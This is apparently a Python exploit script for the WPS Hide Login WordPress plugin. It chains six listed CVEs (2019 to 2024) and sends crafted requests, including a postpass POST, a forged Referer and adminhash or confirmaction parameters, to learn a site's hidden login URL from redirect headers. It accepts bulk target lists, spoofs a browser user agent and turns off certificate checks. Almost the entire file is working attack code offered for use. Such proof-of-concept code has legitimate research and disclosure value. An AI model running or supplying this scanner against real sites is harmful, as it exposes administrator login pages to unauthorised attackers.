#!/usr/bin/env python3
# =============================================================================
# Author:           Sélim Lanouar (@whattheslime)
# CVEs:             CVE-2024-2473, CVE-2021-24917, CVE-2019-15826
#                   CVE-2019-15825, CVE-2019-15824, CVE-2019-15823
# CVEs Authors:     - Daniel Ruf (@DanielRuf)
#                   - Julio Potier (@JulioPotier)
#                   - Sélim Lanouar (@whattheslime)
# CVSS Scores:      5.3 (Medium)
# CVSS Vectors:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
# Date:             April 2024
# Product:          WPS Hide Login (WordPress plugin)
# Title:            Hidden login page location disclosure
# Version:          <= 1.9.15.2
# =============================================================================
from argparse import ArgumentParser, Namespace
from pathlib import Path
from requests import Session, Response
from secrets import token_hex
from urllib.parse import urljoin
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning


ERROR = " \033[1;31m[!]\033[0m"
FAILURE = " \033[1;34m[-]\033[0m"
SUCCESS = " \033[1;32m[+]\033[0m"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
)


def parse_args() -> Namespace:
    """Parse user arguments."""

    parser = ArgumentParser()

    parser.add_argument(
        "targets",
        metavar="TARGET",
        type=str,
        nargs="+",
        help="targets URLs with scheme (e.g. https://target.com) or files "
        "paths containing urls separated by newlines.",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        type=str,
        default="",
        help="proxy url with scheme (e.g. http://127.0.0.1:8080).",
    )
    return parser.parse_args()


def get_login(response: Response, notfound_page: str) -> str:
    """Parse response headers to find login page in location."""

    if "location" in response.headers:
        login_page = response.headers["location"].split("?")[0]
        if login_page != notfound_page and "/wp-login.php" not in login_page:
            return login_page
    return ""


def load_list(objs: list[str]) -> list:
    """Process ArgParse argument with `type=str` and `nargs='+' and return a
    list of unique strings."""

    result = []
    for obj in objs:
        if Path(obj).is_file():
            with open(obj, "r") as file:
                result += [line.strip() for line in file]
        else:
            result += [obj]
    return result


def show_login(session: Session, target: str) -> tuple[str, str]:
    """Test one by one all vulnerabilities to retrieve login page."""

    # Get usual redirect location page (default one is /404/).

    notfound_page = ""
    url = urljoin(target, "/wp-admin/")
    response = session.get(url, allow_redirects=False)
    if "location" in response.headers:
        notfound_page = response.headers["location"].split("?")[0]
    else:
        return "", "unable to get default redirect page (e.g. /404/)."

    if notfound_page == urljoin(target, "/wp-login.php"):
        return notfound_page, "WPS Hide Login plugin is not enabled!"

    # CVE-2024-2473 - from version 1.5.1 included to 1.9.15.2 included.

    url = urljoin(target, "/wp-admin/?action=postpass")
    data = {"post_password": token_hex(5)}
    response = session.post(url, data=data, allow_redirects=False)

    login_page = get_login(response, notfound_page)
    if login_page:
        return login_page, "CVE-2024-2473"

    # CVE-2021-24917 - from version 1.3.1 included to 1.9.0 included.

    url = urljoin(target, "/wp-admin/options.php")
    headers = {"Referer": token_hex(5)}
    response = session.get(url, headers=headers, allow_redirects=False)

    login_page = get_login(response, notfound_page)
    if login_page:
        return login_page, "CVE-2021-24917"

    # CVE-2019-15826 - from version x.x.x to 1.5.2.2 included.

    url = urljoin(target, "/wp-login.php?action=postpass")
    headers = {"Referer": "wp-login.php"}
    response = session.post(url, headers=headers, allow_redirects=False)

    login_page = get_login(response, notfound_page)
    if login_page:
        return login_page, "2019-15826"

    # CVE-2019-15825 - from version x.x.x to 1.5.2.2 included.

    url = urljoin(target, "/?action=rp&key&login")
    response = session.get(url, allow_redirects=False)

    login_page = get_login(response, notfound_page)
    if login_page:
        return login_page, "CVE-2019-15825"

    # CVE-2019-15824 - from version x.x.x to 1.5.2.2 included.

    url = urljoin(target, "/wp-admin/?adminhash=1")
    response = session.get(url, allow_redirects=False)

    login_page = get_login(response, notfound_page)
    if login_page:
        return login_page, "CVE-2019-15824"

    # CVE-2019-15823 - from version x.x.x to 1.5.2.2 included.

    url = urljoin(target, "/wp-login.php?action=confirmaction")
    response = session.get(url, allow_redirects=False)

    login_page = get_login(response, notfound_page)
    if login_page:
        return login_page, "2019-15823"

    return "", "Login page not found!"


def main():
    """Exploit entry point."""

    args = parse_args()

    for target in load_list(args.targets):
        with Session() as session:
            disable_warnings(InsecureRequestWarning)
            session.headers["User-Agent"] = USER_AGENT
            session.proxies["all"] = args.proxy
            session.verify = False
            try:
                login_page, message = show_login(session, target)

                if login_page:
                    print(SUCCESS, login_page, f"\033[2m({message})\033[0m")
                else:
                    print(FAILURE, target, message)
            except Exception as error:
                print(ERROR, error)


if __name__ == "__main__":
    main()
